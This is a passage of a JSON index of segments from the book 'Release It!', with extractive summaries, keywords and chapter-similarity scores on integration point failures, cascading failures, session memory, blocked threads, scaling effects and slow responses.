      "summary": "The first packet shows an address routing protocol (ARP) request.\nPackets 5, 6, and 7 are the three-phase handshake for a TCP connection setup.\nNote that the pane below the packet trace shows the layers of encapsulation that the TCP/IP stack created around the HTTP request in the second packet.\nFinally, the payload of the TCP packet is an HTTP request.\nA handful of packets were being sent from the application servers to the database servers, but with no replies.\nOnce established, a TCP connection can exist for days without a single packet being sent by either side.\nInside each firewall, a set of access control lists define the rules about which connections it will allow.\nThe rules say such things as “connections originating from 192.0.2.0/24 to 192.168.1.199 port 80 are allowed.” When the firewall sees an incoming SYN packet, it checks it against its rule base.\nThe packet might be allowed (routed to the destination network), rejected (TCP reset packet sent back to origin), or ignored (dropped on the floor with no response at all).\nIf the connection is allowed, then the firewall makes an entry in its own internal table that says something like “192.0.2.98:32770 is connected to 192.168.1.199:80.” Then all future packets,\nin either direction, that match the endpoints of the connection are routed between the firewall’s networks.\nThe key is that table of established connections inside the firewall.\nAlong with the endpoints of the connection, the firewall also keeps a “last packet” time.\nIf too much time elapses without a packet on a connection, the firewall assumes that the endpoints are dead or gone.\nThe endpoints assume their connection is valid for an indefinite length of time, even if no packets are crossing the wire.\nInstead, the TCP/IP stack sent the packet, waited for an ACK, didn’t get one, and retransmitted.\na 2.6 series kernel, has its tcp_retries2 set to the default value of 15, which results in a twenty-minute timeout before the TCP/IP stack will inform the socket library that the connection is broken.\nDuring the slow overnight times, traffic volume was light enough that a single database connection would get checked out of the pool, used, and checked back in.\nThen the next request would get the same connection, leaving the thirty-nine others to sit idle until traffic started to ramp up.\nThey were idle well over the one-hour idle connection timeout configured into the firewall.\nOnce traffic started to ramp up, those thirty-nine connections per application server would get locked up immediately.\nEven if the one connection was still being used to serve pages, sooner or later it would be checked out by a thread that ended up blocked on a connection from one of the other pools.\nThen the one good connection would be held by a blocked thread.\nThe resource pool has the ability to test JDBC connections for validity before checking them out.\nIt checked validity by executing a SQL query like “SELECT SYSDATE FROM DUAL.” Well, that would’ve just make the request-handling thread hang anyway.\nWe could also have had the pool keep track of the idle time of the JDBC connection and discard any that were older than one hour.\nUnfortunately, that strategy involves sending a packet to the database server to tell it that the session is being torn down.\nWe were starting to look at some really hairy complexities, such as creating a “reaper” thread to find connections that were close to getting too old and tearing them down before they timed out.\nOracle has a feature called dead connection detection that you can enable to discover when clients have crashed.\nWhen enabled, the database server sends a ping packet to the client at some periodic interval.\nIf the client fails to respond after a few retries, the database server assumes the client has crashed and frees up all the resources held by that connection.\nThe ping packet itself, however, was what we needed to reset the firewall’s “last packet” time for the connection, keeping the connection alive.\nThe provider may accept the TCP connection but never respond to the\nThe provider may accept the connection but not read the request.\nThe provider may send back a response with a content type the caller doesn’t expect or know how to handle, such as a generic web server 404 page in HTML instead of a JSON response.\nUse a client library that allows fine-grained control over timeouts—including both the connection timeout and read timeout—and response handling.\nThat might be true of the server software they sell, but it’s rarely true for their client libraries.\nUsually, software vendors provide client API libraries that have a lot of problems and often have stability risks.\nWhether it’s an internal resource pool, socket read calls, HTTP connections, or just plain old Java serialization, vendor API libraries are peppered with unsafe coding practices.\nstability_anti_patterns/Connection.java public interface Connection {\nDepending on the threading model inside the client library and how long your callback method takes, synchronizing the callback method could block threads inside the client library.\nAs always, once all the request-handling threads are blocked, your application might as well be down.\nThe most effective stability patterns to combat integration point failures are Circuit Breaker on page 95 and Decoupling Middleware on page 117.\nEvery integration point will eventually fail in some way, and you need to be prepared for that failure.\nDebugging integration point failures usually requires peeling back a layer of abstraction.\nIf your system scales horizontally, then you will have load-balanced farms or clusters where each server runs the same applications.\nFor example, in the eight-server farm shown in the figure on page 47, each node handles 12.5 percent of the total load.",
      "keywords": [
        "connection",
        "packet",
        "TCP",
        "TCP connection",
        "integration point",
        "TCP packet",
        "integration point failures",
        "firewall",
        "client",
        "Integration",
        "n’t",
        "server",
        "HTTP request",
        "TCP reset packet",
        "point"
      ],
      "concepts": [
        "packets",
        "connected",
        "server",
        "threads",
        "failure",
        "response",
        "called",
        "protocols",
        "network",
        "integration"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.668,
          "base_score": 0.518,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.624,
          "base_score": 0.474,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.578,
          "base_score": 0.428,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.477,
          "base_score": 0.327,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.467,
          "base_score": 0.317,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "packet",
          "connection",
          "tcp",
          "firewall",
          "client"
        ],
        "semantic": [],
        "merged": [
          "packet",
          "connection",
          "tcp",
          "firewall",
          "client"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.230611755773758,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245857+00:00"
      }
    },
    {
      "chapter_number": 8,
      "title": "Segment 8 (pages 59-66)",
      "start_page": 59,
      "end_page": 66,
      "summary": "If the first server failed because of some load-related condition, such as a memory leak or intermittent race condition, the surviving nodes become more likely to fail.\nA chain reaction occurs when an application has some defect—usually a resource leak or a load-related crash.\nSplitting a layer into multiple pools—as in the Bulkhead pattern on page 98—can sometimes help by splitting a single chain reaction into two separate chain reactions that occur at different rates.\nWell, for one thing, a chain reaction failure in one layer can easily lead to a cascading failure in a calling layer.\nIncoming requests will get distributed out to the applica- tions on other servers in the same layer, increasing their chance of failure.\nThe application servers would connect to a virtual IP address instead of specific search engines (see Migratory Virtual IP Addresses, on page 189, for more about load balancing and virtual IP addresses).\nThe load balancer then distribut- ed the application servers’ queries out to the search engines.\nThe load balancer also performed health checks to discover which servers were alive and responsive so it could make sure to send queries only to search engines that were alive.\nThe search engine had some bug that caused a memory leak.\nAs each search engine went dark, the load balancer would send their share of the queries to the remaining servers, causing them to run out of memory even faster.\nThis particular system also suffered from cascading failures and blocked threads.\nA chain reaction happens because the death of one server makes the others pick up the slack.\nCascading Failures • 49\nMost of the time, a chain reaction happens when your application has a memory leak.\nAs one server runs out of memory and goes down, the other servers pick up the dead one’s burden.\nThe increased traffic means they leak memory faster.\nAgain, if one server goes down to a deadlock, the increased load on the others makes them more likely to hit the deadlock too.\nPartitioning servers with Bulkheads, on page 98, can prevent chain reactions from taking out the entire service—though they won’t help the callers of whichever partition does go down.\nCascading Failures\nA cascading failure occurs when a crack in one layer triggers a crack in a calling layer.\nIf the caller handles it badly, then the caller will also start to fail, resulting in a cascading failure.\nSometimes search servers were off to the side.\nCascading failures require some mechanism to transmit the failure from one layer to another.\nThe failure “jumps the gap” when bad behavior in the calling layer gets triggered by the failure condition in the provider.\nCascading failures often result from resource pools that get drained because of a failure in a lower layer.\nIntegration points without timeouts are a surefire way to create cascading failures.\nAt some point, the lower layer was suffering from a race condition that would make it kick out an error once in a while for no good reason.\nUltimately, the calling layer was using 100 percent of its CPU making calls to the lower layer and logging failures in calls to the lower layer.\nJust as integration points are the number-one source of cracks, cascading failures are the number-one crack accelerator.\nThe most effective patterns to combat cascading failures are Circuit Breaker and Timeouts.\nA cascading failure occurs when cracks jump from one system or layer to another, usually because of insufficiently paranoid integration points.\nA cascading failure can also happen after a chain reaction in a lower layer.\nA cascading failure often results from a resource pool, such as a connec- tion pool, that gets exhausted when none of its calls return.\nExcess traffic can stress the memory system in several ways.\nAssuming you use memory-based ses- sions (see Off-Heap Memory, Off-Host Memory, on page 54, for an alternative to in-memory sessions), the session stays resident in memory for a certain length of time after the last request from that user.\nEvery additional user means more memory.\nDuring that dead time, the session still occupies valuable memory.\nEvery object you put into the session sits there in memory, tying up precious bytes that could be serving some other user.\nWhen memory gets short, a large number of surprising things can happen.\nIt would be wonderful if there was a way to keep things in the session (therefore in memory) when memory is plentiful but automatically be more frugal when memory is tight.\nThe basic idea is that a weak reference holds another object, called the payload, but only until the garbage collector needs to reclaim memory.\nThink about using a third-party or open source caching library that uses weak references to reclaim memory.\nWhen memory gets low, the garbage collector is allowed to reclaim any weakly reachable objects.\nYou have to read your runtime’s docs very carefully, but usually the only guarantee is that weakly reachable objects will be reclaimed before an out-of-memory error occurs.\nWeak references are a useful way to respond to changing memory conditions, but they do add complexity.\nAnother effective way to deal with per-user memory is to farm it out to a dif- ferent process.\nMany systems use Redis to hold session data instead of keeping it in memory or in a relational database.\nYou may not spend much time thinking about the number of sockets on your server, but that’s another limit you can run into when traffic gets heavy.",
      "keywords": [
        "Server",
        "memory",
        "chain reaction",
        "cascading failures",
        "layer",
        "failure",
        "Cluster Manager Server",
        "system",
        "lower layer",
        "Load Balancer",
        "Load",
        "Chain",
        "cascading",
        "Clients Server",
        "chain reaction failure"
      ],
      "concepts": [
        "memory",
        "server",
        "layer",
        "failure",
        "session",
        "sessions",
        "gets",
        "cascading",
        "cascade",
        "users"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.678,
          "base_score": 0.528,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.675,
          "base_score": 0.525,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.638,
          "base_score": 0.488,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.637,
          "base_score": 0.487,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.631,
          "base_score": 0.481,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "memory",
          "layer",
          "cascading",
          "chain reaction",
          "chain"
        ],
        "semantic": [],
        "merged": [
          "memory",
          "layer",
          "cascading",
          "chain reaction",
          "chain"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.3343772335936994,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245896+00:00"
      }
    },
    {
      "chapter_number": 9,
      "title": "Segment 9 (pages 67-74)",
      "start_page": 67,
      "end_page": 74,
      "summary": "Your application will probably need some changes to listen on multiple IP addresses and handle connections across them all without starving any of the listen queues.\nIf the socket were reused too quickly, then a bogon could arrive with the exact right com- bination of IP address, destination port number, and TCP sequence number to be accepted as legitimate data for the new connection.\nUsers • 55\nThat’s already as many pages as a typical user’s entire session.\nThere is no effective defense against expensive users.\nThe best thing you can do about expensive users is test aggressively.\nIn keeping with the general theme of “weird, bad things happen in the real world,” weird, bad users are definitely out there.\nFor example, I’ve seen badly configured proxy servers start requesting a user’s last URL over and over again.\nI was able to identify the user’s session by its cookie and then trace the session back to the registered customer.\nFor some reason, fifteen minutes after the user’s last request, the request started reappearing in the logs.\nThese requests had the user’s identifying cookie but not his session cookie.\nSo each request was creating a new session.\nPick a deep link from the site and start requesting it without sending cookies.\nDon’t even wait for the response; just drop the socket connection as soon as you’ve sent the request.\nWeb servers never tell the application servers that the end user stopped listening for an answer.\nThe application server just keeps on process- ing the request.\nIn the meantime, the 100 bytes of the HTTP request cause the application server to create a session (which may consume several kilobytes of memory in the application server).\nEven a desktop machine on a broadband connection can generate hundreds of thousands of sessions on the application servers.\nThe developers wrote a little interceptor that would update the “last login” time whenever a user’s profile got loaded into memory from the database.\nDuring these session floods, though, the request presented a user ID cookie but no session cookie.\nThat meant each request was treated like a new login, loading the profile from the database and attempting to update the “last login” time.\nUsers • 57\nTo the server, each new requester emerges from the swirling fog and makes some demand like “GET /site/index.jsp.” Once answered, they disappear back into the fog without so much as a thank you.\nAt the same time, high-volume sites found that passing real state in cookies uses up lots of expensive bandwidth and CPU time.\nSo cookies started being used for smaller pieces of data, just enough to tag a user with a persistent cookie or a temporary cookie to identify a session.\nAll the user really sends are a series of HTTP requests.\nEarly CGI applications had no need for a session, since they would fire up a new process (usually a Perl script) for each new request.\nTo reach higher volumes, however, developers and vendors turned to long-running application servers, such as Java application servers and long-running Perl processes via mod_perl.\nInstead of waiting for a process fork on each request, the server is always running, waiting for requests.\nWith the long-running server, you can cache state from one request to another, reducing the number of hits to the database.\nThen you need some way to identify a request as part of a session.\nApplication servers handle all the cookie machinery for you, presenting a nice program- matic interface with some resemblance to a Map or Dictionary.\nWhen that invisible machinery involves layers of kludges meant to make HTTP look like a real application protocol, it can tip over badly.\nEach request creates a new session, consuming memory for no good reason.\nIf the web server is configured to ask the application server for every URL, not just ones within a mapped context, then sessions can get created by requests for nonexistent pages.\nOnce a single transaction with a lock on the user’s profile gets hung (because of the need for a connection from a different resource pool), all the other database transactions on that row get blocked.\nGiven the rate that they can request pages, it’s more like sending a battalion of people into the store with clipboards.\nWorse yet, these rapid-fire screen scrapers do not honor session cookies, so if you are not using URL rewriting to track sessions, each new page request will create a new session.\nUsers • 59\nSome of these even go so far as to change their user-agent strings around from one request to the next.\nWhen these requests are sequentially spidering an entire product category, it’s more likely to be a screen scraper.) You may end up blocking quite a few subnets, so it’s a good idea to periodi- cally expire old blocks to keep your firewalls performing well.\nWrite some terms of use for your site that say users can view content only for personal or noncommercial purposes.\nMalicious Users\nAs you have seen before, session management is the most vulnerable point of a server-side web application.\nUsers consume memory.\nEach user’s session requires some memory.\nUsers • 61\nMalicious users are out there.\nMultithreading makes application servers scalable enough to handle the web’s largest sites, but it also introduces the possibility of concurrency errors.",
      "keywords": [
        "Users",
        "application servers",
        "session",
        "application",
        "request",
        "server",
        "requests",
        "web server",
        "system",
        "connections",
        "web",
        "cookie",
        "Java application servers",
        "Stability",
        "report erratum"
      ],
      "concepts": [
        "user",
        "application",
        "applications",
        "run",
        "running",
        "cookie",
        "request",
        "requests",
        "session",
        "sessions"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 35,
          "title": "",
          "score": 0.653,
          "base_score": 0.503,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 36,
          "title": "",
          "score": 0.634,
          "base_score": 0.484,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.453,
          "base_score": 0.453,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.442,
          "base_score": 0.442,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.412,
          "base_score": 0.412,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "session",
          "request",
          "cookie",
          "users",
          "user"
        ],
        "semantic": [],
        "merged": [
          "session",
          "request",
          "cookie",
          "users",
          "user"
        ]
      },
      "topic_id": 6,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2671447553284663,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245932+00:00"
      }
    },
    {
      "chapter_number": 10,
      "title": "Segment 10 (pages 75-82)",
      "start_page": 75,
      "end_page": 82,
      "summary": "Blocked Threads • 63\nThe process runs and runs but does nothing because every thread available for processing transactions is blocked waiting on some impossible outcome.\nBlocked threads can happen anytime you check resources out of a connection pool, deal with caches or object registries, or make calls to external systems.\nIf the code is structured properly, a thread will occasionally block whenever two (or more) threads try to access the same critical section at the same time.\nIf you find yourself synchronizing methods on your domain objects, you should probably rethink the design.\nFirst, if you are synchronizing the methods to ensure data integrity, then your application will break when it runs on more than one server.\nSecond, your application will scale better if request-handling threads never block each other.\nWhen the time comes to alter their state, do it by constructing and issuing a “command object.” This style is called “Command Query Responsibility Separation,” and it nicely avoids a large number of concurrency issues.\nYou would be correct, but the point is that nothing in the calling code tells you that one of these calls is blocking and the other is not.\nBlocked Threads • 65\nOnly one thread may execute inside the method at a time.\nWhile one thread is executing this method, any other callers of the method will be blocked.\nSince nearly 25 percent of the inventory lookups were on the week’s “hot items” and there could be as many as 4,000 (worst case) concurrent requests against the undersized, overworked inventory system, the developer decided to cache the resulting Availability object.\nOn a hit, it would return the cached object.\nFollowing good object orientation princi- ples, the developer decided to create an extension of GlobalObjectCache, overriding the get() method to make the remote call.\nAt that point, any thread calling RemoteAvailabilityCache.get() would block, because one single thread was inside the create() call, waiting for a response that would never come.\nThe conditions for failure were created by the blocking threads and the unbalanced capacities.\nBlocked Threads • 67\nUse Caching, Carefully\nCaching can be a powerful response to a performance problem.\nIt can reduce the load on the database server and cut response times to a fraction of what they would be without caching.\nWhen misused, however, caching can create new problems.\nNo matter what memory size you set on the cache, you need to monitor hit rates for the cached items to see whether most items are being used from cache.\nKeeping something in cache is a bet that the cost of generating it once, plus the cost of hashing and lookups, is less than the cost of generating it every time it’s needed.\nIf a particular cached object is used only once during the lifetime of a server, then caching it is of no help.\nIt’s also wise to avoid caching things that are cheap to generate.\nAs a result, caches that use weak references will help the garbage collector reclaim memory instead of preventing it.\nLibraries are notorious sources of blocking threads, whether they are open- source packages or vendor code.\nThese often make request threads block forever when a problem occurs.\nIf it’s an open source library, then you may have the time, skills, and resources to find and fix such problems.\nInside the call, you use a pool of your own worker threads.\nIf the call makes it through the library in time, then the worker thread delivers its result to the future.\nIf the call does not complete in time, the request-handling thread abandons the call, even though the worker thread might eventually complete.\nIf you’re dealing with vendor code, it may also be worth some time beating them up for a better client library.\nA blocked thread is often found near an integration point.\nThese blocked threads can quickly lead to chain reactions if the remote end of the integration fails.\nBlocked threads and slow responses can create a positive feedback loop, amplifying a minor problem into a total failure.\nRecall that the Blocked Threads antipattern is the proximate cause of most failures.\nApplication failures nearly always relate to Blocked Threads in one way or another, including the ever-popular “gradual slowdown” and “hung server.” The Blocked Threads antipattern leads to Chain Reactions and Cascading Failures antipatterns.\nLike Cascading Failures, the Blocked Threads antipattern usually happens around resource pools, particularly database connection pools.\nAlways use timeouts, even though it means you need more error-handling code.\nSometimes it’s the coupon code that gets reused a thousand times or the pricing error that makes one SKU get ordered as many times as all other products com- bined.\nFor example, in an ATG-based infrastructure,7 one lock manager always handles distributed lock management to ensure cache coherency.\nIf a popular item is inadvertently modified (because of a programming error, for example), then you can end up with thousands of request-handling threads on hundreds of servers all serialized waiting for a write lock on one item.",
      "keywords": [
        "Blocked Threads",
        "Blocked Threads antipattern",
        "Threads",
        "system",
        "cache",
        "object",
        "code",
        "Blocked",
        "Threads antipattern",
        "time",
        "method",
        "involve outright crashes",
        "server",
        "report erratum",
        "n’t"
      ],
      "concepts": [
        "caches",
        "cached",
        "object",
        "threads",
        "memory",
        "code",
        "times",
        "timing",
        "problem",
        "failures"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.652,
          "base_score": 0.502,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.638,
          "base_score": 0.488,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.635,
          "base_score": 0.485,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 13,
          "title": "",
          "score": 0.598,
          "base_score": 0.448,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.572,
          "base_score": 0.422,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "threads",
          "blocked",
          "blocked threads",
          "thread",
          "threads antipattern"
        ],
        "semantic": [],
        "merged": [
          "threads",
          "blocked",
          "blocked threads",
          "thread",
          "threads antipattern"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.26962138705387767,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245967+00:00"
      }
    },
    {
      "chapter_number": 11,
      "title": "Segment 11 (pages 83-90)",
      "start_page": 83,
      "end_page": 90,
      "summary": "Scaling Effects • 71\nProgramming errors, unexpected scaling effects, and shared resources all create risks when traffic surges.\nScaling Effects\nWe run into such scaling effects all the time.\nBecause the development and test environments rarely replicate production sizing, it can be hard to see where scaling effects will bite you.\nOne of the worst places that scaling effects will bite you is with point-to-point communication.\nQA Server 2\nProd Server 2Production Environment\nScaling Effects • 73\nIf the application will only ever have two servers, then point-to-point communication is perfectly fine.\n(As long as the communication is written so it won’t block when the other server dies!) As the number of servers grows, then a different communication strategy is needed.\nShared Resources\nWith some application servers, the shared resource will be a cluster manager or a lock manager.\nWhen the shared resource gets overloaded, it’ll become a bottleneck limiting capacity.\nWhen the shared resource is redundant and nonexclusive—meaning it can service several of its consumers at once—then there’s no problem.\nEach server operates independently, without need for coordination or calls to any centralized services.\nIn a shared nothing architecture, capacity scales more or less linearly with the number of servers.\nThe trouble with a shared-nothing architecture is that it might scale better at the cost of failover.\nA user’s session resides in memory on an application server.\nObviously, we’d like that transition to be invisible to the user, so the user’s session should be loaded into the new application server.\nPerhaps the application server sends the user’s session to a session backup server after each page request.\nMaybe it serializes the session into a database table or shares its sessions with another designated application server.\nYou can approximate a shared-nothing architecture by reducing the fan-in of shared resources, i.e., cutting down the number of servers calling on the shared resource.\nIn the example of session failover, you could do this by designating pairs of application servers that each act as the failover server for the other.\nIn these cases, the probability of con- tention scales with the number of transactions processed by the layer and the number of clients in that layer.\nIt depends on what function the caller needs the shared resource to provide.\nExamine production versus QA environments to spot Scaling Effects.\nYou get bitten by Scaling Effects when you move from small one-to-one development and test environments to full-sized production environments.\nPoint-to-point communication scales badly, since the number of connec- tions increases as the square of the number of participants.\nOnce you’re dealing with tens of servers, you will probably need to replace it with some kind of one-to-many communication.\nShared resources can be a bottleneck, a capacity constraint, and a threat to stability.\nIf your system must use some sort of shared resource, stress- test it heavily.\nAlso, be sure its clients will keep working if the shared resource gets slow or locks up.\nIn the illustration on page 76, the front-end service has 3,000 request-handling threads available.\nSo if you can’t build every service large enough to meet the potentially over- whelming demand from the front end, then you must build both callers and providers to be resilient in the face of a tsunami of requests.\nThe main reason is that QA for every system is usually scaled down to just two servers.\nSo during integration testing, two servers represent the front-end system and two servers represent the back-end system, resulting in a one- to-one ratio.\nIf your system is resilient, it might slow down—even start to fail fast if it can’t process transactions within the allowed time (see Fail Fast, on page 106)—but it should recover once the load goes down.\nIn development and QA, your system probably looks like one or two servers, and so do all the QA versions of the other systems you call.\nCheck the ratio of front-end to back-end servers, along with the number of threads each side can handle in production compared to QA.\nUnbalanced Capacities is a special case of Scaling Effects: one side of a relationship scales up much more than the other side.\nEven if your production environment is a fixed size, don’t let your QA languish at a measly pair of servers.\nScale it up.\nTry test cases where you scale the caller and provider to different ratios.\nIf you provide the back-end system, see what happens if it suddenly gets ten times the highest-ever demand, hitting the most expensive transaction.",
      "keywords": [
        "Scaling Effects",
        "shared resource",
        "server",
        "system",
        "shared",
        "Scaling",
        "service",
        "Effects",
        "App",
        "application server",
        "resource",
        "number",
        "communication",
        "Prod Server",
        "Dev Server App"
      ],
      "concepts": [
        "server",
        "scaling",
        "scales",
        "service",
        "capacity",
        "capacities",
        "gets",
        "getting",
        "threads",
        "production"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.674,
          "base_score": 0.524,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.634,
          "base_score": 0.484,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.591,
          "base_score": 0.441,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.563,
          "base_score": 0.413,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.533,
          "base_score": 0.383,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "shared",
          "scaling",
          "scaling effects",
          "shared resource",
          "effects"
        ],
        "semantic": [],
        "merged": [
          "shared",
          "scaling",
          "scaling effects",
          "shared resource",
          "effects"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2870175437481247,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246009+00:00"
      }
    },
    {
      "chapter_number": 12,
      "title": "Segment 12 (pages 91-98)",
      "start_page": 91,
      "end_page": 98,
      "summary": "The increased current load would hit just when supply was low, causing excess demand to trip circuit breakers.\nThat means the transient load on the database is much higher when applications start up than after they’ve been running for a while.\nWhen a bunch of servers impose this transient load all at once, it’s called a dogpile.\nSome configuration management tools allow you to configure a randomized “slew” that will cause servers to pull changes at slightly different times, dis- persing the dogpile across several seconds.\nA pulse can develop during load tests, if the virtual user scripts have fixed- time waits in them.\n1. First, the admins shut down their autoscaler service so that they could upgrade a ZooKeeper cluster.9\nA similar condition can occur with service discovery systems.\nA service dis- covery service is a distributed system that attempts to report on the state of many distributed systems to other distributed systems.\nThey run health checks periodically to see if any of the services’ nodes should be taken out of rotation.\nIf a single instance of one of the services stops responding, then the discovery service removes that node’s IP address.\nservice Amany nodes\nservice Bmany nodes\nservice Cmany nodes\nservice Dmany nodes\nespecially challenging failure mode occurs when a service discovery node is itself partitioned away from the rest of the network.\nAs shown in the next figure, node 3 of the discovery service can no longer reach any of the managed services.\nAny application that needs a service gets told, “Sorry, but it looks like a meteor hit the data center.\nservice Amany nodes\nservice Bmany nodes\nservice Cmany nodes\nservice Dmany nodes\nConsider a similar failure, but with a platform management service instead.\nThis service is responsible for starting and stopping machine instances.\nIf it forms a belief that everything is down, then it would necessarily start a new copy of every single service required to run the enterprise.\nRather, it’s more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\nIn the case of the discovery service, the partitioned node was not able to cor- rectly sense the current state.\nDepending on the individual jobs’ processing time, the number of instances might be “infinity.” That will smart when the Amazon Web Services bill arrives!\nSuppose your control plane senses excess load every second, but it takes five minutes to start a virtual machine to handle the load.\nThat time is usually longer than a monitoring interval, so make sure to account for some delay in the system’s response to the action.\nSlow Responses\nAs you saw in Socket-Based Protocols, on page 35, generating a slow response is worse than refusing a connection or returning an error, particularly in the context of middle-layer services.\nSlow Responses • 85\nSlow responses usually result from excessive demand.\nSlow responses can also happen as a symptom of some underlying problem.\nMemory leaks often manifest via Slow Responses as the virtual machine works harder and harder to reclaim enough space to process a transaction.\nI have occasionally seen Slow Responses resulting from network congestion.\nSlow responses tend to propagate upward from layer to layer in a gradual form of cascading failure.\nSlow Responses trigger Cascading Failures.\nUpstream systems experiencing Slow Responses will themselves slow down and might be vulnerable to stability problems when the response times exceed their own timeouts.\nFor websites, Slow Responses cause more traffic.\nIf your system tracks its own responsiveness, then it can tell when it’s getting slow.\nConsider sending an immediate error response when the average response time exceeds the system’s allowed time (or at the very least, when the average response time exceeds the caller’s timeout!).\nContention for an inadequate supply of database connections produces Slow Responses.\nMemory leaks cause excessive effort in the garbage collector, resulting in Slow Responses.\nInefficient low-level proto- cols can cause network stalls, also resulting in Slow Responses.\nUnless your application explicitly limits the number of results it’s willing to process, it can end up exhausting its memory or spinning in a while loop long after the user loses interest.",
      "keywords": [
        "Slow Responses",
        "system",
        "service",
        "slow",
        "nodes service",
        "Responses",
        "load",
        "state",
        "service Amany nodes",
        "nodes service Bmany",
        "time",
        "nodes",
        "report erratum",
        "report",
        "service discovery systems"
      ],
      "concepts": [
        "service",
        "time",
        "load",
        "slow",
        "starts",
        "responsible",
        "response",
        "report",
        "failure",
        "nodes"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.711,
          "base_score": 0.561,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.689,
          "base_score": 0.539,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.646,
          "base_score": 0.496,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
